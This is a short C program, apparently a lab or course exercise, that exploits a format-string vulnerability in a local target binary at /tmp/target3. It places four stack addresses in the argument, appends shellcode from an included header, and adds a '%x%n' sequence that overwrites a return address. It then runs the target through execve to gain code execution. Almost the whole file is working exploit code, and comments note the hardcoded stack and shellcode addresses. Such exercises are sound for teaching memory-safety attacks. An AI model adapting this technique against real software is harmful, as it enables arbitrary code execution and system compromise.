#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
	// sp address at 0xbefffd68
	// shellcode address: 0xbefffca4
	// 99 88 3c 191 
	char arg1[200];
	strcpy(arg1,"\x6c\xfd\xff\xbeJUNK\x6d\xfd\xff\xbeJUNK\x6e\xfd\xff\xbeJUNK\x6f\xfd\xff\xbe");
	strcat(arg1, shellcode);
	strcat(arg1,"%099x%n%88x%n%3c%n%191x%n");
	arg1[199]=0;
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
